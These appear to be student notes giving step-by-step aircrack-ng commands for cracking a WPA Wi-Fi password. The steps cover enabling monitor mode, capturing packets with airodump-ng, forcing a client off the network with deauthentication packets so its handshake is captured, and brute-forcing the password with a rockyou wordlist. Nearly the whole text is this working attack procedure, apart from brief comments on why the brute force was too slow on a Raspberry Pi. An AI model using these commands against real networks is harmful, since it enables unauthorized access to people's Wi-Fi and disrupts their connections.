###**WPA**

###Steps/Commands

**Window 1**
* service network-manager stop
* airmon-ng start "INTERFACE"
* airodump-ng mon0
* airodump-ng --bssid "BSSID" -c "Channel" --showack -w wpa_log "INTERFACE"

**New window**
* aireplay-ng -0 20 -a "BSSID" -c "HOSTNMAC" "INTERFACE" 
  * Will deauthenticate the host computer from the WiFi network (-0). We send 20 deauth packets (-20) Computer will probably reconnect automattically (Windows default setting), now we can catch the handshake! Once we have this handshake captured we can start cracking. You can check in Window 1 if you have captured the handshake.
* Ctrl + c
* Clear
* aircrack-ng wpa_log-01.cap -w "path to wordlist"
  * wpa_log-01.cap => Filename where airodump logs every packet (You can change the filename with -w)
  * "path to wordlist" !? WPA doesn't have the weakness in IV's like WEP has. We have to bruteforce the password. The wordlist is a text file containing possibilities (aka common passwords). An example is [rockyou](http://scrapmaker.com/download/data/wordlists/dictionaries/rockyou.txt)

###Some comments

We didn't do it on the RPi2 because:
* The hardware is to slow for bruteforcing
* It took ages to download the rockyou file @ school
* Bruteforcing is quite useless with the "random" generated passwords as default. (takes to long)

The bruteforcing can be speed up by using the GPU power.
